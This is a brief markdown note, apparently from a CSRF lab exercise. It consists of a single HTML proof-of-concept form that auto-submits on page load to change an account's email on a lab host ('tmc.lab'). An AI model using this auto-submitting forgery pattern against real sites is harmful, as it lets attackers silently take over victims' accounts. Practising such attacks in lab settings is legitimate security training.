# Cross-Site Resquest Forgery (CSRF)

```html
<form action="http://tmc.lab/labs/csrf0x01.php" method="post">
    <div class="mb-3 form-group">
        <label for="email">Email</label>
        <input type="text" name="email" value="berty@gmail.com" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email">
    </div>
    <script type="text/javascript">
        window.onload = function(){
            document.forms[0].submit();
        }
    </script>
</form>
```


